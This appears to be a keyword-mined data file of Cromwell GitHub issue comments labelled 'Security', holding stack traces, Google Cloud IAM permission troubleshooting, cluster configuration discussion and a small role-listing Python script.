(file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.value",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2620,access,access,2620,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"essage:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]; permissions = [permission for role in roles_json if 'includedPermissions' in role for permission in role['includedPermissions']]. df = pd.DataFrame(dict(roles=roles, permissions=permissions)); df.to_csv(sys.stdout, sep = '\t', header = False, index = False); ```; When running this script, I get:; ```; $ ./roles.py | grep ""lifesciences.workflowsRunner\|iam.serviceAccountUser\|storage.objectAdmin\|storage.objectCreator\|storage.objectViewer"" | column -t; roles/iam.serviceAccountUser iam.serviceAccounts.actAs; roles/iam.serviceAccountUser iam.serviceAccounts.get; roles/iam.serviceAccountUser iam.serviceAccounts.list; roles/iam.serviceAccountUser resourcemanager.projects.get; roles/iam.serviceAccountUser resourcemanager.projects.list; roles/lifesciences.workflowsRunner life",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955:1826,Authoriz,Authorization,1826,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-685188955,1,['Authoriz'],['Authorization']
Security,"es} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm sure that I (and @illusional if he is able) would be happy to write this up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1502,access,access,1502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,"figuration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:8841,validat,validateCredential,8841,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,"file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jerem",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2396,access,access,2396,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"fo-prod -h \""Content-Type: text/plain; charset=UTF-8\"" cp /cromwell_root/stdout gs://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${tmpDir}/err.$$""; mkfifo ""$oute4a6eeab"" ""$erre4a6eeab""; trap 'rm ""$oute4a6eeab"" ""$erre4a6eeab""' EXIT; tee '/cromwell_root/stdout' < ""$oute4a6eeab"" &; tee '/cromwell_root/stderr' < ""$erre4a6eeab"" >&2 &; (; cd /cromwell_root. /usr/gitc/gatk4/gatk-launch --javaOptions ""-XX:GCTimeLimit=50 -XX:GCHeapFreeLimit=10 -XX:+PrintFlagsFinal \; -XX:+PrintGCTimeStamps -XX:+PrintGCDateSta",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:2124,access,access,2124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"ftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4618,Validat,Validation,4618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,2,['Validat'],"['Validation', 'ValidationTry']"
Security,"fun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Error evaluating ad hoc files:; <path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:579); 	... 35 common frames omitted; ```. The above stack trace was consuming the actual error:; `NoSuchFileException:<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution/centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir; `. Somewhere while resolving host to call root, instead of returning the path to inputs as `centaur/src/main/resources/standardTestCases/cwl_dynamic_initial_workdir/testdir`, it resolves the path by prefixing the call root context path, which is `<path_prefix>/cromwell/cromwell-executions/main/c9194073-c6ed-4c2a-97d6-fbc6a2314883/call-main/execution`. As a result, it tries to look for inputs inside the `execution` folder rather than inside `centaur/.../testdir`. This test passes in Travis and it might have different folder st",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:4705,Validat,Validation,4705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,2,['Validat'],"['Validation', 'ValidationTry']"
Security,"g to add role `storage.objects.create` it errors out with:; ```; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleCon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2594,authoriz,authorization,2594,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,2,['authoriz'],['authorization']
Security,"gine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.j",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6770,secur,security,6770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"gle.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The princip",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080:1563,audit,audit,1563,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686595080,1,['audit'],['audit']
Security,"going to restructure for unit tests, also I'd like to see this work with controlled access data at least once during manual testing...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934:84,access,access,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485#issuecomment-913158934,1,['access'],['access']
Security,h maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1649,access,access,1649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"he Travis output, the build failure is currently being caused by:; ```; [0m[[0minfo[0m] [0m[31m*** 1 TEST FAILED ***[0m[0m; [0m[[0minfo[0m] [0m[31mWdlSubworkflowWomSpec:[0m[0m; [0m[[0minfo[0m] [0m[31mWdlNamespaces with subworkflows [0m[0m; [0m[[0minfo[0m] [0m[31m- should support WDL to WOM conversion of subworkflow calls *** FAILED *** (51 milliseconds)[0m[0m; [0m[[0minfo[0m] [0m[31m wdl4s.parser.WdlParser$SyntaxError: ERROR: out is declared as a Array[String] but the expression evaluates to a String:[0m[0m; [0m[[0minfo[0m] [0m[31m[0m[0m; [0m[[0minfo[0m] [0m[31m Array[String] out = inner.out[0m[0m; [0m[[0minfo[0m] [0m[31m ^[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$typeCheckDeclaration$1(WdlNamespace.scala:493)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.Option.flatMap(Option.scala:171)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.typeCheckDeclaration(WdlNamespace.scala:488)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.validateDeclaration(WdlNamespace.scala:466)[0m[0m; [0m[[0minfo[0m] [0m[31m at wdl.WdlNamespace$.$anonfun$apply$35(WdlNamespace.scala:381)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:241)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.Iterator.foreach$(Iterator.scala:929)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.AbstractIterator.foreach(Iterator.scala:1417)[0m[0m; [0m[[0minfo[0m] [0m[31m at scala.collection.IterableLike.foreach(IterableLike.scala:71)[0m[0m; ```. I'm not sure whether you intended to roll back that change at the same time as rolling back the test case? I think we can argue to make the set of coercions explicit in draft 3 (and not include `X => Array[X]`), but IMO we shouldn't ""unsupport"" that Cromwell feature with this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838:1085,validat,validateDeclaration,1085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2807#issuecomment-342278838,1,['validat'],['validateDeclaration']
Security,"he following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Creator (roles/storage.objectCreator); 4. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Viewer (roles/storage.objectViewer). And I have got the following error from Cromwell:; ```; java.lang.Exception: Task xxx.xxxNA:1 failed. Job exited without an error, exit code 0. PAPI error code 9. Please check the log file for more details: xxx; ```; And the log just contains this cryptic message:; ```; yyyy/mm/dd hh:mm:ss Starting container setup.; ```; I have then tried to run Cromwell with the following roles:; 1. [Cloud Life Sciences](https://cloud.google.com/life-sciences/docs/concepts/access-control#roles) Workflows Runner (lifesciences.workflowsRunner); 2. [Service Account User](https://cloud.google.com/iam/docs/service-accounts#user-role) (iam.serviceAccountUser); 3. [Storage Object](https://cloud.google.com/storage/docs/access-control/iam-roles) Admin (storage.objectAdmin). And the workflow succeeded. To give a full explanation of the set of roles and permissions needed, I wrote a little python script `roles.py` that collects this information from Google:; ```; #!/bin/python3; import subprocess; import requests; import pandas as pd; import sys. token = subprocess.check_output([""gcloud"",""auth"",""print-access-token""]).decode(""utf8"").strip(); response = requests.get(""https://iam.googleapis.com/v1/roles"", headers={""accept"": ""application/json"", ""Authorization"": ""Bearer ""+token}, params={""pageSize"": 1000, ""view"": ""FULL""}); roles_json = response.json()['roles']; roles = [role['name'] for role in roles_json if 'includedPermissions' in role for permission in 